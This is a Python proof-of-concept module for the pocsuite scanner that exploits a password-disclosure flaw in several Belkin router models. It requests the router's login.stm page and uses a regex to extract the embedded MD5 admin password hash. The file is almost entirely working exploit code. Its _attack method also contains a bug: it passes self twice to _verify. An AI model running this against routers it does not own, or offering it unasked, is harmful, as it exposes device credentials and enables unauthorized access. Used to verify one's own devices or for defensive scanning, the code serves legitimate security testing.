#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re


class TestPOC(POCBase):
    name = "Belkin Auth Bypass"
    vulID = ''
    author = ['sebao']
    vulType = 'Auth Bypass'
    version = '1.0'  # default version: 1.0
    references = 'https://www.exploit-db.com/exploits/40081/'
    desc = 'Module exploits Belkin authentication using MD5 password disclosure.'


    vulDate = ''
    createDate = '2017-10-13'
    updateDate = '2017-10-13'

    appName = 'belkin'
    appVersion = 'Belkin Play Max (F7D4401),F5D8633,N900 (F9K1104),N300 (F7D7301),AC1200'
    dork = ''
    appPowerLink = 'http://www.belkin.com'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = self.url + '/login.stm'
        resp = req.get(url)


        password = re.search('password = "(.+?)"', resp.content)

        if resp.status_code == 200 and password:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Password'] = password.group(1)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
